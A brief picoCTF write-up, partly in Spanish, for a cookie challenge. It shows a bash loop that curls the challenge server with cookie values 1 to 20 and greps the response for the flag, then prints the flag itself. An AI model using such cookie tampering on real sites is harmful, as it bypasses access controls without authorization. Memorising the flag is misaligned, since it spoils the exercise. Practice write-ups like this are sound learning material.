# Reto
# Descripcion
Who doesn't love cookies? Try to figure out the best one.

Additional details will be available after launching your challenge instance.
# Solucion

```
for i in {1..20}; do curl -s http://wily-courier.picoctf.net:55893/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
```
### Flag: picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}
# Notas
Al cambiar  el valor del request de la cookie se ve como cambia la palabra, en lugar de ver valor por valor hice un cliclo for para recorrer 20 valores de la cookie a ver si aparecia la bandera la en alguna solicitud resultado que si aparece
# Referencias
